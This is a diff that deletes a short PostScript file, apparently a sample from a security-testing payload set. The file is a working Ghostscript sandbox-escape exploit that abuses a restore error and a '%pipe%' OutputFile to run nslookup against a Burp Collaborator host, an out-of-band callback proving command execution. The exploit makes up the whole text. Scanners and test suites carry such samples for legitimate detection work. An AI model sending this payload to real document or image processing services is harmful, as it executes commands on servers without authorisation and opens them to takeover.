@@ -1,6 +1,0 @@
-%!PS
-userdict /setpagedevice undef
-legal
-{ null restore } stopped { pop } if
-legal
-mark /OutputFile (%pipe%nslookup NN.6nuk1hyccvjr9h8akg46mgyojfp8mwb.burpcollaborator.net) currentdevice putdeviceprops
